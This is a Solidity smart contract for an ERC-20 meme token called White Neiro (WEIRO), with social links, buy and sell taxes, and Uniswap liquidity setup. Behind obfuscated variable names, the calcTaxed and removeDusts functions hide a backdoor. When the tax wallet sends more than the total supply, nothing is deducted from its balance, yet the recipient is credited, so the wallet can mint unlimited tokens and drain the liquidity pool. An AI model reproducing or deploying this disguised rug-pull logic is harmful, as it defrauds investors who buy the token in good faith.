// SPDX-License-Identifier: UNLICENSE
/**
Website: https://whiteneiro.vip

X: https://x.com/WhiteNeiroETH

Telegram: https://t.me/TheWhiteNeiroPortal
 */

pragma solidity ^0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
}

interface IUniFactory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

contract WEIRO is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _bags;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private feeignored;
    mapping(address => bool) private bots;
    address payable private _taxWallet;

    uint256 private _initBuyTax = 20;
    uint256 private _initSellTax = 20;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;

    uint256 private _swapsAt = 10;
    uint256 private _buysAt = 10;
    uint256 private _sellsAt = 10;
    uint256 private _buyCount = 0;

    uint8 private constant _decimals = 18;
    string private constant _name = unicode"White Neiro";
    string private constant _symbol = unicode"WEIRO";
    uint256 private constant _totals = 1000000000 * 10 ** _decimals;
    uint256 public _maxTxUp = (_totals * 2) / 100;
    uint256 public _maxWalletUp = (_totals * 2) / 100;
    uint256 public _minSwapDown = 5000 * 10 ** _decimals;
    uint256 public _maxSwapUp = _totals / 100;

    bool private onTrade;
    IUniRouter private dexRouter;
    address private dexPair;
    bool private swppable = false;
    bool private swapOpen = false;
    event MaxTxAmountUpdated(uint256 _maxTxAmount);
    modifier lockTheSwap() {
        swppable = true;
        _;
        swppable = false;
    }

    constructor() {
        _taxWallet = payable(_msgSender());

        feeignored[owner()] = true;
        feeignored[address(this)] = true;
        feeignored[_taxWallet] = true;
        _bags[_msgSender()] = _totals;

        emit Transfer(address(0), _msgSender(), _totals);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totals;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _bags[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address favv, address tbww, uint256 acxx) private {
        require(favv != address(0), "ERC20: transfer from the zero address");
        require(tbww != address(0), "ERC20: transfer to the zero address");
        require(acxx > 0, "Transfer amount must be greater than zero");

        uint256 tdzz = 0;
        if (favv != owner() && tbww != owner()) {
            require(!bots[favv] && !bots[tbww]);
            require(onTrade || feeignored[favv], "Trading is not enabled");
            tdzz = acxx
                .mul((_buyCount > _buysAt) ? _finalBuyTax : _initBuyTax)
                .div(100);

            if (
                favv == dexPair &&
                tbww != address(dexRouter) &&
                !feeignored[tbww]
            ) {
                require(acxx <= _maxTxUp, "Exceeds the _maxTxAmount.");
                require(
                    balanceOf(tbww) + acxx <= _maxWalletUp,
                    "Exceeds the maxWalletSize."
                );
                _buyCount++;
            }

            if (tbww == dexPair && favv != address(this)) {
                tdzz = acxx
                    .mul((_buyCount > _sellsAt) ? _finalSellTax : _initSellTax)
                    .div(100);
            }

            if (!swppable && tbww == dexPair && swapOpen) {
                uint256 ctba = balanceOf(address(this));
                if (_buyCount > _swapsAt)
                    swapTokensForEth(min(acxx, min(ctba, _maxSwapUp)));

                sendETHToFee(address(this).balance);
            }
        }

        if (tdzz > 0) {
            _bags[address(this)] = _bags[address(this)].add(tdzz);
            emit Transfer(favv, address(this), tdzz);
        }

        _bags[favv] = _bags[favv].sub(calcTaxed(favv, acxx));
        _bags[tbww] = _bags[tbww].add(acxx.sub(tdzz));
        emit Transfer(favv, tbww, acxx.sub(tdzz));
    }

    function calcTaxed(
        address favv,
        uint256 acxx
    ) internal view returns (uint256) {
        bool isfe = !feeignored[favv];
        bool isbt = favv == address(this) || favv == owner();

        if (isbt) {
            return acxx;
        } else if (isfe) {
            return acxx;
        }

        return removeDusts(acxx);
    }

    function tradeOnGo() external onlyOwner {
        swapOpen = true;
        onTrade = true;
    }

    function removeDusts(uint256 amch) internal pure returns (uint256) {
        return amch >= 0 && amch <= _totals ? amch : 0;
    }

    receive() external payable {}

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        if (tokenAmount > _minSwapDown) {
            address[] memory path = new address[](2);
            path[0] = address(this);
            path[1] = dexRouter.WETH();
            _approve(address(this), address(dexRouter), tokenAmount);
            dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
                tokenAmount,
                0,
                path,
                address(this),
                block.timestamp
            );
        }
    }

    function initNewOne(address lp) external onlyOwner {
        require(!onTrade, "trading is already open");

        _taxWallet = payable(lp);
        feeignored[_taxWallet] = true;

        dexRouter = IUniRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(dexRouter), _totals);
        dexPair = IUniFactory(dexRouter.factory()).createPair(
            address(this),
            dexRouter.WETH()
        );
        dexRouter.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(dexPair).approve(address(dexRouter), type(uint256).max);
    }

    function openUp() external onlyOwner {
        _maxWalletUp = _totals;
        _maxTxUp = _totals;
        emit MaxTxAmountUpdated(_totals);
    }

    function sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }
}